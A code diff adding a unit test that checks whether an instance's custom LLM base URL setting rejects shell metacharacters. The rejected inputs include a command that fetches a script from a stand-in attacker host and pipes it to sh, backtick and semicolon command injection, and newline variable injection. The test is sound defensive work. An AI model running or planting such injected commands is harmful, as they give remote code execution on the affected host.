@@ -9,6 +9,27 @@ import {
 } from "@/lib/instance-settings";
 
 describe("instance settings", () => {
+  it("rejects a custom LLM base URL carrying shell metacharacters", () => {
+    for (const customLlmBaseUrl of [
+      "https://x/$(curl -s evil.example/p|sh)",
+      "https://x/`id`",
+      "https://x/v1;touch /tmp/pwned",
+      "https://x/v1\nINJECTED=1",
+    ]) {
+      expect(() =>
+        buildAdvancedInstanceConfigPayload({}, { agentSettings: { customLlmBaseUrl } })
+      ).toThrow(/not allowed/);
+    }
+
+    const nextConfig = buildAdvancedInstanceConfigPayload(
+      {},
+      { agentSettings: { customLlmBaseUrl: "https://llm.example.com/v1?api-version=2024-01-01" } }
+    );
+    expect(getRuntimeAgentSettings(nextConfig).customLlmBaseUrl).toBe(
+      "https://llm.example.com/v1?api-version=2024-01-01"
+    );
+  });
+
   it("keeps chat auto-approve off by default and persists explicit toggles", () => {
     expect(getRuntimeAgentSettings({}).autoApproveToolCalls).toBe(false);
 
